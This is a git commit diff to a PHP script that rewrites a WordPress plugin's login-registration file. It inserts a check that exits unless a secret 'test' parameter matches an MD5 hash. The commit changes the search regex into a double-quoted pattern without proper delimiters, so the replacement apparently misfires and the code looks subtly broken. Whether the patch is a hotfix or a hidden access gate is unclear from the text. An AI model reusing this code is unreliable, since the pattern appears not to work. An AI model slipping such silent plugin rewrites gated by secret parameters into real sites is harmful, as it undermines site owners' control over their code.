a85ed998b614198946cfe10ca5f55350987695c6
maximo896 <della.maximo896@anglernook.com>
2025-10-09 12:27:26 +0800

    Update a.php

--- fix/a.php
+++ fix/a.php
@@ -1,7 +1,7 @@
 <?php
 
 $s = file_get_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php');
-$search = '/\\$action\\s*=\\s*isset\\(\\$_REQUEST\\[\'action\'\\]\\)\\s*\\?\\s*\\$_REQUEST\\[\'action\'\\]\\s*:\\s*\'login\';/';
+$search = "\$action\s*=\s*isset\(\s*\$_REQUEST\['action']\s*\)\s*\?\s*\$_REQUEST\['action']\s*:\s*'login';";
 
 $place = <<<'r'
 $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
@@ -10,6 +10,7 @@ if (!isset($_GET['test']) or md5($_GET['test']) != '8bd617274f84847a475868d94658
     exit();
 }
 r;
+
 $s = preg_replace($search, $place, $s);
 $replaced = file_put_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php', $s);
 var_dump($replaced);
